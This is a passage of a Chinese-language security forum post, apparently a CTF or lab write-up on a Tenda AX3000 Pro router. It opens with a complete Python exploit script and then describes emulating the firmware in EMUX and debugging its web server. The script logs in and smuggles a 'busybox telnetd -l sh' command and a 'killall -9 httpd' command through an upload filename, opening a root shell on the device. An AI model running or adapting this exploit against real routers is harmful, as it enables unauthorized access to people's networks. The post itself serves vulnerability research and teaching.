
```python
import requests
import urllib3
import json
import hashlib
import time
# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class RouterExploit:
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.host = f"{target_ip}:{target_port}"
        self.base_url = f"http://{target_ip}:{target_port}"
        self.session = requests.Session()
        self.stok = None
        self.sign = None

    def md5_hash(self, password):
        """Calculate MD5 hash of password"""
        return hashlib.md5(password.encode()).hexdigest().upper()

    def login(self, username="admin", password="admin"):
        """Login to router and obtain authentication token"""
        # First visit login page to get initial cookies
        login_html = f"{self.base_url}/login.html"
        response = self.session.post(
            login_html,
            verify=False,
            allow_redirects=True,
            timeout=10
        )
        print(f"Login page status: {response.status_code}")

        login_url = f"{self.base_url}/login/Auth"
        # Password needs MD5 encryption
        hashed_password = self.md5_hash(password)
        # Login data
        login_data = {
            "userName": username,
            "password": hashed_password
        }

        try:
            print(f"[*] Attempting to login to {self.base_url}...")
            print(f"[*] Username: {username}")
            print(f"[*] Password MD5: {hashed_password}")
            response = self.session.post(
                login_url,
                json=login_data,
                verify=False,
                timeout=10
            )
            print(f"[*] Login response status code: {response.status_code}")

            if response.status_code == 200:
                result = response.json()
                if result.get("errCode") == 0:
                    self.stok = result.get("stok")
                    self.sign = result.get("sign")
                    print(f"[+] Login successful!")
                    print(f"[+] Obtained stok: {self.stok}")
                    print(f"[+] Obtained sign: {self.sign}")
                    return True
                else:
                    print(f"[-] Login failed, error code: {result.get('errCode')}")
                    return False
            else:
                print(f"[-] Login request failed, status code: {response.status_code}")
                return False
        except requests.exceptions.RequestException as e:
            print(f"[-] Login request error: {e}")
            return False
        except json.JSONDecodeError:
            print(f"[-] Failed to parse login response")
            return False

    def exploit_upload_command_injection(self, telnet_port=9999):
        """
        Exploit command injection vulnerability through file upload functionality
        """
        if not self.stok:
            print("[-] Please login first to obtain authentication token")
            return False

        upload_url = f"{self.base_url}/cgi-bin/UploadCfg"

        # Build request body
        boundary = "----WebKitFormBoundarymDMrPSMBEYxfE1pT"
        malicious_filename = f"'&busybox telnetd -l sh -p {telnet_port}&killall -9 httpd&'1.cfg"

        # Use precise format including all line breaks
        body_lines = [
            f"--{boundary}",
            f'Content-Disposition: form-data; name="file"; filename="{malicious_filename}"',
            "Content-Type: application/octet-stream",
            "",
            "#The word of \"Default\" must not be removed",
            "Default",
            "",
            "##the public configure end##",
            "",
            "",
            f"--{boundary}--"
        ]
        body = "\r\n".join(body_lines)  # Use \r\n as line break
        body = body + "\r\n"

        # Calculate exact Content-Length
        content_length = len(body)

        # Request headers
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}"
        }

        try:
            print(f"\n[*] Sending command injection attack...")
            print(f"[*] Injected command: busybox telnetd -l sh -p {telnet_port}")
            response = self.session.post(
                upload_url,
                headers=headers,
                data=body,
                verify=False,
                timeout=10
            )
            print(f"[*] Attack response status code: {response.status_code}")
            print(f"[*] Response content: {response.text}")

            # Even if error is returned, command might have executed
            print("[+] Command injection request sent")
            print(f"[*] Telnet service should start on port {telnet_port}")
            return True
        except requests.exceptions.RequestException as e:
            print(f"[-] Attack request error: {e}")
            return False

    def check_telnet_service(self, port=9999):
        """
        Check if telnet service started successfully
        """
        import socket
        print(f"\n[*] Checking telnet service {self.target_ip}:{port}...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target_ip, port))
            sock.close()
            if result == 0:
                print(f"[+] Telnet service started on {self.target_ip}:{port}!")
                print(f"[+] Connect using: telnet {self.target_ip} {port}")
                return True
            else:
                print(f"[-] Telnet service not responding on {self.target_ip}:{port}")
                return False
        except Exception as e:
            print(f"[-] Error checking telnet service: {e}")
            return False

    def run_exploit(self, username="admin", password="admin", telnet_port=9999):
        """
        Execute complete attack process
        """
        print("=" * 60)
        print("Router Command Injection Exploit Script")
        print(f"Target: {self.base_url}")
        print("=" * 60)

        # Step 1: Login
        if not self.login(username, password):
            print("[-] Login failed, attack terminated")
            return False

        # Step 2: Execute command injection
        if not self.exploit_upload_command_injection(telnet_port):
            print("[-] Command injection failed")
            return False

        # Step 3: Wait and check service
        print("\n[*] Waiting for telnet service to start...")
        time.sleep(5)
        if self.check_telnet_service(telnet_port):
            print("\n[+] Attack completed successfully!")
            return True
        else:
            print("\n[-] Attack may have failed, please check manually")
            return False


def main():
    # Configuration parameters
    target_ip = "172.22.197.151"
    target_port = 20080
    username = "admin"
    password = "KANXUECTF"  # Change to actual password
    telnet_port = 9999

    # Create exploit instance
    exploit = RouterExploit(target_ip, target_port)

    # Execute attack
    exploit.run_exploit(username, password, telnet_port)


if __name__ == "__main__":
    main()
```

版本 : [AX3000_Pro_V16.03.49.26](https://bbs.kanxue.com/elink@bdbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2@1k6h3&6V1j5g2)9J5k6h3y4G2L8g2)9J5k6h3y4F1i4K6u0r3L8h3q4@1k6i4u0A6j5h3I4Q4x3V1k6K6K9r3!0%4i4K6u0r3y4U0x3$3y4e0p5H3y4U0t1@1x3K6M7@1z5o6f1K6)

EMUX : [emux](https://bbs.kanxue.com/elink@2afK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6@1K9r3g2J5k6h3q4D9M7$3q4#2L8h3W2D9i4K6u0r3k6h3#2#2P5l9`.`.)

首先按照官方的步骤配置EMUX的环境:

如果`build-emux-docker`编译失败,设置`DOCKER_BUILDKIT=0`:

之后执行`./run-emux-docker`就进入了EMUX:

路由器的固件配置是在`files/emux/firmware`目录，新建一个`TENDA-USAX3000`目录，目录结构如下:

- `config` 为配置文件，`kernel` 下的为Linux内核文件，`squashfs-root` 下的为路由器固件.

`config`内容如下:

然后在`firmware`下的`devices`中增加一条路由器的设备信息,路由器的固件环境配置就完成了.

之后运行 `./build-emux-volume` :

然后运行 `./run-emux-docker` ,进入emux shell:

运行`launcher` 选择运行的设备,或者新开一个窗口,运行 `./emux-docker-shell`同样进入EMUX-DOCKER的SHELL,之后运行`launcher`选择路由器固件:

![EMUX Devices](https://bbs.kanxue.com/upload/attach/202511/920134_QVXMTP694SPSU7Q.webp)

之后进入EMUX DEVICE CONSOLE:

输入`root`进入路由器的环境选择页面:

![EMUX TD LOGIN](https://bbs.kanxue.com/upload/attach/202511/920134_GE2YHR9QNEMY9DV.webp)

第一个是进入EMUX的AArch64环境，第二个是按照`config`的配置文件运行`initcommands="/etc_ro/init_tab"`后进入路由器的环境，第三个是直接进入路由器的固件shell,选择第三个进入路由器的固件shell:

查看 `inittab` 的信息:

路由器环境初始化运行的是`rcS`脚本,可以直接运行`rcS`脚本，也可以选择性的运行以下的命令:

之后运行开启`httpd`服务的命令:

`HTTPD`的报错提示分为两个部分，一个是`connect`和`func:cfms_mib_proc_handle`的错误，另一个是`goahead`的错误，优先分析`goahead`的错误。

根据`setLocalHost error`的提示，应该是`httpd`的`main`调用`libgo.so`的`websOpen`时报错，在`websOpen`的子函数`sub_FFFFF7983690`发现有获取`br0`网桥的地址：

![TD BR0](https://bbs.kanxue.com/upload/attach/202511/920134_SHWA65UFJ3ENP2N.webp)

使用`ip link` 新增一个虚拟网桥`br0`,并分配和`eth0`相同的IP地址:

再次运行`/bin/httpd --debugger --verbose` 成功开启HTTPD服务:

根据EMUX的端口映射信息，访问20080端口成功打开登陆页面:

![WY LOGIN](https://bbs.kanxue.com/upload/attach/202511/920134_G3947H6XH7NQXE3.webp)

但是输入任何密码都无法进入，重新打开一个`emux-docker` 输入 `userspace` 选择第三个进入路由器的HOST:

![](https://bbs.kanxue.com/upload/attach/202511/920134_U5W4QDEFJSXXVBE.webp)

进入`/var/webroot` 查看 `default.cfg` 的配置文件:

因为没有设置密码`sys.userpass`的值为空，但是`sys.quickset.cfg`为1应该进入路由器的设置页面，却没有进入。

在`libgo.so`中的`authSecurityHandler`函数中有对`g_fast_setting == 1`时跳转到`quickset.html`的判断:

![FAST SETTING](https://bbs.kanxue.com/upload/attach/202511/920134_XNBXVTVZ74942HY.webp)

查看`g_fast_setting`的写函数,是调用了`libcommon.so`的`GetValue()`函数获取`sys.quickset.cfg`的值:

![FAST SETTING](https://bbs.kanxue.com/upload/attach/202511/920134_PY59YUZFV8J4DH9.webp)
